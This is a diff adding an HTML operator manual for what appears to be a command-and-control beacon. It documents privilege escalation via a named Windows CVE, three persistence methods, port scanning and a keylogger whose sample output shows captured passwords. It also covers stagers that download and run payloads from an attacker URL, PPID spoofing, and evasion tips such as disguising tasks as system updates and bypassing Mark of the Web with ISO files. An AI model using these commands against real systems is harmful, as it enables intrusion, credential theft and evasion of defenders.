+        Administrator/UAC step. Exploits CVE-2020-17103
+        (race condition in <code>CfAbortOperation</code>, Cloud Files component).
+        Requires no privileges — works from Medium Integrity Level.
+        Result: a new beacon as <code>NT AUTHORITY\SYSTEM</code>
+        in the current user session.</td></tr>
+</table>
+
+<h3 id="privesc_plasma">privesc_plasma — Details</h3>
+
+<p>The command performs a multi-stage attack (3 stages), fully automated.
+Each stage runs as a separate child process with a 30-second timeout.</p>
+
+<p><b>Requirements:</b></p>
+<ul>
+<li>Windows 10 versions 1903–20H2 (Cloud Files API is available and vulnerable).</li>
+<li>No privileges needed — a standard user (Medium IL) is sufficient.</li>
+<li>The Cloud Files component (<code>cldapi.dll</code>) must be loadable.</li>
+</ul>
+
+<p><b>Result:</b> a new beacon with
+<code>user = SYSTEM</code> appears in the Sessions table, bound to the current session (SessionId is preserved).</p>
+
+<div class="opsec">Creates several child processes (stages 1–3), temporary directories
+in <code>%TEMP%</code>, and calls <code>schtasks.exe</code>.
+May be detected by: unusual entry in <code>Volatile Environment</code>,
+a non-standard <code>wermgr.exe</code> outside <code>C:\Windows\System32</code>,
+a WER task running outside its normal context.</div>
+
+<h2 id="persist"><a name="persist"></a>Persistence</h2>
+<p>Three autorun mechanisms on the target side: <code>Run</code> registry key,
+Scheduled Task, and WMI event subscription.
+Registry and Task Scheduler work in the current user's context without admin rights.
+WMI subscription requires <b>Local Admin</b> and fires even without a user login.</p>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>persist_reg</code></td>
+    <td><code>&lt;name&gt; &lt;path&gt;</code></td>
+    <td>Writes a value to
+        <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code>.
+        Autorun on every login of the current user.</td></tr>
+<tr><td><code>persist_task</code></td>
+    <td><code>&lt;name&gt; &lt;path&gt;</code></td>
+    <td>Creates a Scheduled Task via the Task Scheduler API. Trigger: Logon.
+        Hidden, no privilege elevation, runs when network is available.</td></tr>
+<tr><td><code>persist_wmi</code></td>
+    <td><code>&lt;name&gt; &lt;interval_sec&gt; &lt;exe_path&gt;</code></td>
+    <td>WMI event subscription in <code>ROOT\subscription</code>.
+        Creates three objects:
+        <ul style="margin:4px 0">
+          <li><code>__EventFilter</code> — fires every ~<code>interval_sec</code> seconds.</li>
+          <li><code>ActiveScriptEventConsumer</code> — runs <code>exe_path</code>.</li>
+          <li><code>__FilterToConsumerBinding</code> — binds the filter and consumer.</li>
+        </ul>
+        Fires every ~<code>interval_sec</code> seconds.
+        Executes as <code>SYSTEM</code> via the <code>WMI</code> service.
+        Requires <b>Local Admin</b>.<br>
+        <b>Removal:</b><br>
+        <code>wmic /namespace:\\root\subscription path __EventFilter where "Name='&lt;name&gt;'" delete</code><br>
+        <code>wmic /namespace:\\root\subscription path ActiveScriptEventConsumer where "Name='&lt;name&gt;'" delete</code><br>
+        <code>wmic /namespace:\\root\subscription path __FilterToConsumerBinding where "Filter=""__EventFilter.Name='&lt;name&gt;'""" delete</code>
+    </td></tr>
+</table>
+<div class="opsec">
+<b>Examples:</b><br>
+<code>persist_reg edge_update C:\Users\%USERNAME%\AppData\Local\Temp\svchost.exe</code><br>
+<code>persist_task OneDriveUpdater C:\Users\%USERNAME%\AppData\Roaming\Microsoft\svchost.exe</code><br>
+<code>persist_wmi WindowsUpdate 60 C:\Windows\Temp\svchost.exe</code><br><br>
+<b>Detection:</b><br>
+<ul>
+<li>Registry Run key &rarr; Sysmon event 13 (<code>RegistryEvent</code>)</li>
+<li>Scheduled Task &rarr; Windows Security log, event 4698 (Task created)</li>
+<li>WMI subscription &rarr; Sysmon events 19/20/21 (<code>WmiEvent</code>); also Microsoft-Windows-WMI-Activity/Operational</li>
+</ul>
+To reduce visibility: mask the name to look like a system one
+(<code>MicrosoftEdgeUpdateCore</code>, <code>WindowsDefenderUpdate</code>)
+and store the executable in standard system directories
+(<code>%WINDIR%\Temp\</code>, <code>%APPDATA%\Microsoft\Windows\</code>).
+</div>
+
+<h2 id="portscan"><a name="portscan"></a>Port Scan</h2>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>portscan</code></td>
+    <td><code>&lt;target&gt; [ports]</code></td>
+    <td>TCP connect scan from the beacon's machine.<br>
+        <b>ports</b> — comma-separated <code>"22,80,443"</code>, range <code>"1-1024"</code>,
+        combination <code>"22,100-200,443"</code>, or empty (top-30 by default).</td></tr>
+</table>
+<div class="opsec">
+<b>Examples:</b><br>
+<code>portscan 192.168.1.1</code> — top-30 ports<br>
+<code>portscan 10.0.0.5 1-1024</code><br>
+<code>portscan dc01.corp.local 22,80,135,139,443,445,3389,5985</code><br><br>
+<b>Output:</b><br>
+<pre>PORT      STATE     SERVICE
+--------- --------- -------
+80/tcp    open      http
+443/tcp   open      https
+3389/tcp  open      ms-wbt-server
+
+Scan of 192.168.1.1: 3 open port(s), 30 scanned (0.512s)</pre>
+Results appear as ports are scanned (streaming output), not at the end.
+</div>
+
+<h2 id="keylogger"><a name="keylogger"></a>Keylogger</h2>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>keylogger start</code></td><td></td>
+    <td>Installs a system-wide keyboard hook in a background thread.
+        All keystrokes are buffered in memory with the active window title.</td></tr>
+<tr><td><code>keylogger dump</code></td><td></td>
+    <td>Flushes the accumulated buffer to the console <b>without stopping</b> capture.
+        After sending, the buffer is cleared — the next <code>dump</code> will show
+        only new keystrokes.</td></tr>
+<tr><td><code>keylogger stop</code></td><td></td>
+    <td>Removes the hook, flushes the remaining buffer to the console, frees memory.</td></tr>
+</table>
+<div class="opsec">
+<b>Output format:</b><br>
+<pre>[Chrome - mail.google.com]
+admin@corp.local[TAB]Password123[ENTER]
+
+[Notepad - secret.txt]
+Hello world</pre>
+For long captures, call <code>dump</code> periodically — the internal buffer
+has a limited size; new keystrokes are dropped when full.<br>
+<b>Detection:</b> a system keyboard hook is visible in Process Hacker / API Monitor.
+</div>
+
+<h2 id="stagers"><a name="stagers"></a>Stagers (spawn via interpreter)</h2>
+<p>These commands create a delivery file on the target disk and immediately launch it via
+the corresponding Windows interpreter. Launch is performed with PPID spoofing:
+the parent of the new process becomes <code>explorer.exe</code>, not the beacon.
+The interpreter downloads the payload from the specified URL and runs it.</p>
+
+<p>Process tree from the EDR's perspective:</p>
+<pre>
+explorer.exe
+  └─ mshta.exe / wscript.exe / hh.exe / cmd.exe
+       └─ payload.exe
+</pre>
+
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Interpreter</th><th>Description</th></tr>
+<tr>
+  <td><code>stager_lnk</code></td>
+  <td><code>&lt;url&gt; &lt;out_path&gt; [--rm-after]</code></td>
+  <td><code>cmd.exe /c start /b</code></td>
+  <td>Creates a <code>.lnk</code> — target <code>cmd.exe</code>,
+      arguments: download URL via PowerShell and run.</td>
+</tr>
+<tr>
+  <td><code>stager_hta</code></td>
+  <td><code>&lt;url&gt; &lt;out_path&gt; [--rm-after]</code></td>
+  <td><code>mshta.exe</code></td>
+  <td>Creates an HTML Application (<code>.hta</code>). VBScript inside downloads
+      the URL and runs the payload. Window is hidden, self-closes.</td>
+</tr>
+<tr>
+  <td><code>stager_vbs</code></td>
+  <td><code>&lt;url&gt; &lt;out_path&gt; [--rm-after]</code></td>
+  <td><code>wscript.exe //nologo //b</code></td>
+  <td>Creates a VBScript (<code>.vbs</code>): downloads URL and runs payload.
+      The <code>//b</code> flag — batch mode, no dialogs.</td>
+</tr>
+<tr>
+  <td><code>stager_wsf</code></td>
+  <td><code>&lt;url&gt; &lt;out_path&gt; [--rm-after]</code></td>
+  <td><code>wscript.exe //nologo //b</code></td>
+  <td>Creates a Windows Script File (<code>.wsf</code>): XML wrapper around VBScript.
+      wscript treats WSF as a valid type — fewer extension-based detections
+      than <code>.vbs</code>.</td>
+</tr>
+<tr>
+  <td><code>stager_iso</code></td>
+  <td><code>&lt;url&gt; &lt;out_path&gt; [--rm-after]</code></td>
+  <td><code>powershell.exe</code> (Mount-DiskImage)</td>
+  <td>Creates an ISO image. Inside — <code>launch.lnk</code>. Files inside an ISO do not receive
+      MOTW (Mark of the Web) when mounted — Defender does not mark them as
+      "from the internet". PowerShell mounts the image and runs <code>launch.lnk</code>.</td>
+</tr>
+<tr>
+  <td><code>stager_chm</code></td>
+  <td><code>&lt;url&gt; &lt;out_path&gt; [--rm-after]</code></td>
+  <td><code>hh.exe</code></td>
+  <td>Creates a CHM file via <code>hhc.exe</code> (HTML Help Compiler).
+      Contents: HTML with a script that downloads and runs the payload.
+      <b>Requires</b> <code>hhc.exe</code> on the target machine
+      (HTML Help Workshop or Windows SDK).</td>
+</tr>
+</table>
+
+<h3 id="stagers-flag">The --rm-after Flag</h3>
+<p>If <code>--rm-after</code> is specified, the beacon deletes the file from disk
+500&nbsp;ms after launching the interpreter — enough time for
+<code>mshta.exe</code> / <code>wscript.exe</code> to read the script.
+Without the flag the file remains on disk; the operator can retrieve it with
+<code>download</code> or delete it manually with <code>rm</code>.</p>
+
+<h3 id="stagers-ppid">PPID Spoofing</h3>
+<p>Each interpreter is launched with PPID spoofing to the first found
+instance of <code>explorer.exe</code>. In Task Manager, Process Hacker, and Sysmon
+the parent of the process will be <code>explorer.exe</code>, not the beacon.
+If <code>explorer.exe</code> is unavailable (server session without GUI),
+the launch proceeds without spoofing.</p>
+
+<div class="opsec">
+<b>Examples:</b><br>
+<code>stager_hta http://192.168.1.10:8080/s.exe C:\Temp\upd.hta --rm-after</code><br>
+<code>stager_vbs http://192.168.1.10:8080/s.exe C:\ProgramData\svc.vbs --rm-after</code><br>
+<code>stager_wsf http://192.168.1.10:8080/s.exe "%APPDATA%\Microsoft\upd.wsf" --rm-after</code><br>
+<code>stager_lnk http://192.168.1.10:8080/s.exe "C:\Users\Public\doc.lnk"</code><br>
+<code>stager_iso http://192.168.1.10:8080/s.exe C:\Temp\archive.iso --rm-after</code><br>
+<code>stager_chm http://192.168.1.10:8080/s.exe C:\Temp\help.chm --rm-after</code><br><br>
+<b>stager_iso requirements:</b> Windows 8+ (IMAPI2 + PowerShell <code>Mount-DiskImage</code> requires PS 3.0).<br>
+<b>stager_chm requirements:</b> <code>hhc.exe</code> (HTML Help Workshop) on the target machine.
+</div>
+
+<h2 id="control"><a name="control"></a>Beacon Control</h2>
+<table>
+<tr><th>Command</th><th>Arguments</th><th>Description</th></tr>
+<tr><td><code>sleep</code></td><td><code>&lt;ms&gt; [jitter]</code></td>
+    <td>Callback interval in ms, jitter 0–100&nbsp;%. Example: <code>sleep 30000 20</code>.</td></tr>
+<tr><td><code>exit</code></td><td></td>
+    <td>Graceful beacon shutdown. The beacon signals completion,
+        sends a final response, and exits at the end of the current loop iteration.
+        If the beacon is in a long sleep — waits until it wakes up.</td></tr>
+<tr><td><code>kill</code></td><td></td>
+    <td>Immediate destruction of the beacon process with no wait and no final response.
+        Used when the beacon is stuck in a long operation
+        or when a guaranteed quick kill is needed.
+        After <code>kill</code> the session in Sessions is marked as lost
+        after the next heartbeat timeout.</td></tr>
+</table>
+
+</body></html>
